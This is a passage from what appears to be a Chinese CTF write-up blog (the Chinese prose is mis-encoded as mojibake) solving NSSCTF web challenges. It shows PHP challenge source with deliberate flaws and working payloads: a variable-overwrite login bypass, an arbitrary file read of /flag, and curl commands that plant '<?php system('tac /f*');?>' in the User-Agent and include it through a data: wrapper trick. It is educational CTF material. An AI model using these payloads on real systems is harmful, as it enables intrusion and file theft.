&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‚¯å®šæ˜¯æƒ³æ³•å­ç™»å½•è¿›å»<code>$client_ip = $_SERVER[&#39;REMOTE_ADDR&#39;]</code>è¿™ç©æ„è·å–ç”¨æˆ·ipåœ°å€ï¼Œå³ä½¿çŸ¥é“è´¦å·å¯†ç ä¹Ÿç™»å½•ä¸è¿›å»ï¼ç„¶åæ™®é€šç”¨æˆ·ç™»å½•ç»™æˆ‘è·³å›æ¥äº†ï¼Œç›´æ¥çœ‹index.phpæœç„¶æ˜¯<code>$_SESSION[&#39;role&#39;]</code></p><p>é‚£ä¸å°±æ­£å¥½ç”¨ä¸Šäº†ç¬¬ä¸€ä¸ªifè¿›è¡Œå˜é‡è¦†ç›–äº†å—ï¼Œç›´æ¥ä¸€æ¬¡æ€§è¦†ç›–ä¸‰ä¸ªå˜é‡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ç™»å½•ä¸Šå»äº†</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#æ–‡ä»¶åç¼€ç™½åå•æ£€æµ‹ï¼Œæˆ‘å°±ä¸ä¿¡ä½ è¿˜èƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œå˜»å˜»å˜»</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸æƒ³çœ‹åˆ°phpæ–‡ä»¶&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ€ä¹ˆæ²¡æœ‰ä¸œè¥¿ï¼Œè¿™æˆ‘æ”¹ä»€ä¹ˆ&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶é‡å‘½åæˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">files</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">files</span> = <span class="title">scandir</span>(&quot;./<span class="title">uploads</span>/&quot;);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span> ($<span class="title">files</span> <span class="title">as</span> $<span class="title">file</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;a href=<span class="string">&quot;./uploads/&lt;?=<span class="subst">$file</span>?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span><span class="variable">$file</span><span class="meta">?&gt;</span>&lt;/a&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> &#125;&#125;&#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘æŠŠæ— å…³ç´§è¦çš„htmléƒ¨åˆ†ç»™åˆ äº†ï¼</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªphpå—ï¼Œå°±æ˜¯ä¸€ä¸ªåªèƒ½ä¸Šä¼ å›¾ç‰‡çš„ç™½åå•æ£€æµ‹</p><p>ç¬¬äºŒä¸ªphpå—å…³é”®éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>å®ƒä¼šå°†è¯»åˆ°çš„æ–‡ä»¶å†™å…¥æ–°çš„æ–‡ä»¶åï¼Œé‚£ä¸å°±ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–äº†å˜›xd</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?old<span class="built_in">_</span>name=/flag<span class="built_in">&amp;</span>new<span class="built_in">_</span>name=rufeii</span><br><span class="line">NSSCTF&#123;77e17714-ce59-431d-b605-0db30f8bbb50&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include-revenge"><a href="#ez-include-revenge" class="headerlink" title="ez_include_revenge"></a>ez_include_revenge</h2><p>å‰é¢é‚£é“é¢˜çš„åŠ å¼ºç‰ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);   <span class="comment">//ç¦ç”¨phpæµå°è£…åè®®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;                                   <span class="comment">//åˆ›å»ºç›®å½•ç”¨çš„å‡½æ•°ï¼Œåé¢æ¥äº†ä¸ªå¯¹&#x27;è¿›è¡Œè½¬ä¹‰çš„å‡½æ•°</span></span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);        <span class="comment">//åˆ›å»ºusers/rand/ç›®å½•å¹¶åˆ‡åˆ°è¿™ä¸ªç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ç½‘ç«™æ ¹ç›®å½•æŒ‡å‘è¿™ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"><span class="comment">//xffå¯ä»¥æ§åˆ¶åˆ›å»ºçš„ç›®å½•ï¼Œä½†æ˜¯æœ‰æ›¿æ¢ï¼Œbasenameè¿”å›æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¥½åƒè¿™é‡Œæ²¡ä»€ä¹ˆç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));   <span class="comment">//åˆ›å»ºç›®å½•ï¼Œå¹¶ä¸”åœ¨æˆ‘ä»¬åˆ›å»ºçš„ç›®å½•ä¸‹å†™å…¥ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);       <span class="comment">//å›åˆ°users/rand/</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);      <span class="comment">//è¿‡æ»¤ç‚¹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™æ¬¡ä¸ä¼šè®©ä½ å¾—é€äº†ï¼&quot;</span>;       <span class="comment">//flagè¢«ä¸¥æ ¼è¿‡æ»¤ï¼Œä¸Šä¸ªç‰ˆæœ¬çš„ä¸èƒ½æ‰“äº†</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å†æƒ³æƒ³?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);     <span class="comment">//åˆ é™¤åˆ›å»ºçš„ç›®å½•</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ†æå®Œæºç ï¼Œä¸èƒ½ç”¨ç‚¹å’Œphpä¼ªåè®®ï¼Œè¯•äº†ä¸€ä¸‹dataä¼ªåè®®ï¼Œ<code>allow_url_include=0</code>ç›´æ¥é™åˆ¶æ­»äº†è¿œç¨‹åŒ…å«éƒ½ä¸è¡Œäº†ï¼ŒsessionåŒ…å«æš‚ä¸”ä¸è¯´èƒ½ä¸èƒ½è¿‡wafï¼Œæˆ‘ä¼°è®¡<strong>session.upload_progress.enabled</strong>è¿™ä¸ªæ²¡å¼€ï¼Œä¹Ÿæ‰“ä¸äº†ï¼ä¸‹é¢æ‰“ä¸é€šäº†ï¼Œå°±åªèƒ½è€ƒè™‘é…åˆä¸Šé¢ä¸€èµ·æ‰“äº†</p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p><code>file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</code>èƒ½ä¸èƒ½åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: rufeii&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=rufeii/profile&quot;</span><br><span class="line">è¿™ä¸ªä¸è¡Œè‚¯å®šä¼šè¢«æ£€æµ‹åˆ°</span><br><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: .&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=profile&quot;ä½†æ˜¯è¿™ä¸ªå°±æ‰“å‡ºæ¥äº†éé¢„æœŸè¯´æ˜¯</span><br></pre></td></tr></table></figure><p>è«åå…¶å¦™ï¼Œæ‰€ä»¥è¯´è¿˜æ˜¯è¦å¤šå»å°è¯•ï¼Œçœ‹ä¼¼ä¸å¯èƒ½å®åˆ™ä¹Ÿæœ‰å¯èƒ½ï¼</p><p>ä¸ºä»€ä¹ˆä¼šå‡ºç°éé¢„æœŸï¼Ÿ</p><p><img src="/images/achieve/2025/11/4.png"></p><p>file_gets_contentsåªä¼šåœ¨å·¥ä½œç›®å½•æ‰¾ï¼</p><p><img src="/images/achieve/2025/11/5.png"></p><p>mkdiræ— æ³•é€’å½’åˆ›å»ºç›®å½•é™¤éä½¿ç”¨-på‚æ•°ã€‚é‚£ä¹ˆå‰é¢çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>); </span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ²¡ç”¨çš„ï¼Œè¿™ç‚¹å…¶å®åœ¨æŠ¥é”™ä¸­ä¹Ÿå¯ä»¥ä½“ç°ï¼ç„¶åå¦‚æœxffä¸ºç©ºprofileå°±å†™åœ¨htmlç›®å½•ä¸‹ï¼Œchdir(â€˜..â€™)åˆ°wwwï¼Œæ‰€ä»¥æ­¤æ—¶å·¥ä½œç›®å½•æ˜¯wwwï¼è„šæœ¬ç›®å½•æ˜¯htmlï¼file_gets_contentsåœ¨å·¥ä½œç›®å½•è‚¯å®šæ‰¾ä¸åˆ°profileï¼Œä½†æ˜¯includeä¼šå»è„šæœ¬ç›®å½•æ‰¾ï¼Œæ‰€ä»¥ç›´æ¥ç»•è¿‡ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æŠŠprofileå†™åˆ°äº†è„šæœ¬ç›®å½•å»ï¼ˆ&#x2F;var&#x2F;www&#x2F;html&#x2F;profileï¼‰ï¼Œç„¶åå·¥ä½œç›®å½•ä¸æ˜¯è„šæœ¬ç›®å½•çš„æ—¶å€™å°±å¯ä»¥ç»•è¿‡ï¼åˆ©ç”¨çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°å¤„ç†çš„å·®å¼‚æ€§ï¼</p><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>å‰é¢è¯´åˆ°æ˜¯å› ä¸ºå°‘äº†-på‚æ•°ä¸èƒ½é€’å½’åˆ›é€ ç›®å½•ï¼Œå¯¼è‡´profileå†™åˆ°äº†è„šæœ¬ç›®å½•ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œè‚¯å®šä¸Šé¢çš„æ‰“æ³•å°±å¤±æ•ˆäº†ï¼é‚£ä¹ˆå°±æ˜¯é¢„æœŸçš„æ‰“æ³•ï¼</p><p>é¢„æœŸæ‰“æ³•å°±æ˜¯åˆ©ç”¨è¿™ä¸¤ä¸ªç©æ„å¯¹ä¼ªåè®®æ£€æµ‹å·®å¼‚ï¼</p><blockquote><p>file_get_contenså¯¹dataåè®®çš„æ£€æµ‹data:[<mediatype>][;base64],<data><br>include [åè®®å¤´]:&#x2F;&#x2F;è¿™ä¸ªæ‰èƒ½æ£€æµ‹æˆä¼ªåè®®</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æŠŠæ–‡ä»¶åå‘½åä¸ºè¿™ç§å½¢å¼æ˜¯ä¸æ˜¯å°±å¯ä»¥è®©<code>file_get_contents</code>è®¤ä¸ºæ˜¯ä¼ªåè®®ï¼Œä½†æ˜¯includeä¼šå»åŒ…å«ï¼æ‰€ä»¥ç”šç‰›è€Œé€¼ä¹‹ï¼</p><p>payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;X-Forwarded-For: data:,rufeii&quot; -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node9.anna.nssctf.cn:25670/?page=data:,rufeii/profile&quot;</span><br></pre></td></tr></table></figure><h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><h3 id="éé¢„æœŸ-1"><a href="#éé¢„æœŸ-1" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>è¿™é¢˜çš„éé¢„æœŸæ˜¯å‡ºç½‘åå¼¹shell</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 